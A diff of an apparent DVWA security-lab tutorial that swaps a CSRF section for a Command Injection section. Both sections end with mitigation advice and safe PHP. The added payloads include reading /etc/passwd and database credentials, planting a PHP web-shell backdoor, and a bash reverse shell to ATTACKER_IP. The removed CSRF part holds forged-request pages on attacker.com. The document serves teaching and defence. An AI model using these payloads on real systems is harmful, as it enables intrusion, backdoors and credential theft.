@@ -1,84 +1,55 @@
-CSRF (Cross-Site Request Forgery)
+Command Injection
+
 
 🔍 What Is It?
 
-Cross-Site Request Forgery (CSRF) is an attack that tricks an authenticated user into unknowingly submitting a malicious request to a web application they are currently logged into. The server cannot distinguish the forged request from a legitimate one because it comes with the victim's valid session cookies.
-The attacker doesn't steal the session — they abuse it.
+Command Injection is a vulnerability where an attacker can execute arbitrary operating system commands on the server by injecting shell metacharacters into application input that is passed to a system shell function. It is one of the most severe vulnerabilities because it provides direct access to the underlying OS.
 
 
 ⚙️ How It Works in DVWA
 
-
-DVWA's CSRF module has a password change form. At the Low security level, the request to change password looks like:
-GET /vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
-There is no CSRF token — any page that causes the victim's browser to make this GET request will successfully change their password.
+DVWA's Command Injection module asks for an IP address to ping. The backend code does something like:
+php// Vulnerable code
+$output = shell_exec('ping -c 4 ' . $_POST['ip']);
+If the user enters 127.0.0.1, the command is:
+bashping -c 4 127.0.0.1
+But an attacker can chain additional commands using shell operators.
 
 
 💥 Exploitation
 
-Step 1 — Craft a Malicious Page
+Shell Metacharacters
+OperatorBehaviorExample;Run commands sequentially127.0.0.1; whoami&&Run second if first succeeds127.0.0.1 && id||Run second if first failsinvalid || whoami|Pipe output127.0.0.1 | ls`Command substitution127.0.0.1; `id`$()Command substitution127.0.0.1; $(id)
+Practical Payloads
+bash# Identify the user
+127.0.0.1; whoami
 
-The attacker hosts a webpage that silently triggers the password change:
-html<!-- attacker.com/pwn.html -->
-<html>
-  <body>
-    <h1>You won a prize! 🎉</h1>
-    <!-- Auto-submitted form -->
-    <img src="http://dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change" 
-         style="display:none" />
-  </body>
-</html>
-An <img> tag makes a GET request. The victim's browser sends their session cookie automatically.
-Step 2 — Deliver the Link
-The attacker sends the link to the victim via:
+# Read sensitive files
+127.0.0.1; cat /etc/passwd
 
-Phishing email
-Forum post / comment
-Social media message
+# List web root
+127.0.0.1; ls -la /var/www/html
 
-Step 3 — Result
-When the logged-in victim opens attacker.com/pwn.html:
+# Read DVWA config (database credentials)
+127.0.0.1; cat /var/www/html/dvwa/config/config.inc.php
 
-Their browser makes the GET request to DVWA
-DVWA sees a valid session cookie
-DVWA changes the password to pwned
-The victim is locked out of their own account
+# Create a backdoor
+127.0.0.1; echo '<?php system($_GET["c"]); ?>' > /var/www/html/backdoor.php
 
-POST-Based CSRF (Medium Security)
-For POST forms, use a hidden auto-submitting form:
-html<html>
-  <body onload="document.forms[0].submit()">
-    <form action="http://dvwa/vulnerabilities/csrf/" method="POST">
-      <input type="hidden" name="password_new" value="hacked" />
-      <input type="hidden" name="password_conf" value="hacked" />
-      <input type="hidden" name="Change" value="Change" />
-    </form>
-  </body>
-</html>
-Combining CSRF + XSS (Stored CSRF)
-If the application also has Stored XSS, inject the CSRF payload directly:
-html<script>
-  var xhr = new XMLHttpRequest();
-  xhr.open('GET', '/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change', false);
-  xhr.send();
-</script>
-
+# Reverse shell
+127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+Windows Payloads
+cmd127.0.0.1 & whoami
+127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts
+127.0.0.1 | dir C:\
 
 
 🔐 Mitigation
 
-MethodDescriptionCSRF TokensInclude a unique, unpredictable token in every state-changing request; verify server-sideSameSite CookieSet SameSite=Strict or SameSite=Lax to prevent cookies being sent cross-originReferer/Origin Header CheckValidate that requests originate from the expected domainRe-authenticationRequire the current password when changing sensitive settingsDouble Submit CookieSend token in both cookie and request; compare both server-side
-php// ✅ CSRF Token implementation
-session_start();
-if (empty($_SESSION['csrf_token'])) {
-    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+
+MethodDescriptionAvoid Shell FunctionsNever use system(), exec(), shell_exec(), passthru() with user inputUse Safe APIsUse language-native network functions instead of shelling outInput ValidationWhitelist only valid IP address format (regex)escapeshellarg()Wraps input in single quotes and escapes special charactersLeast PrivilegeWeb server process should not run as root
+php// ✅ Safe - escapeshellarg + whitelist
+if (!filter_var($_POST['ip'], FILTER_VALIDATE_IP)) {
+    die("Invalid IP address.");
 }
-
-// In form:
-echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';
-
-// On submit:
-if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
-    die("CSRF token mismatch.");
-}
-
+$output = shell_exec('ping -c 4 ' . escapeshellarg($_POST['ip']));
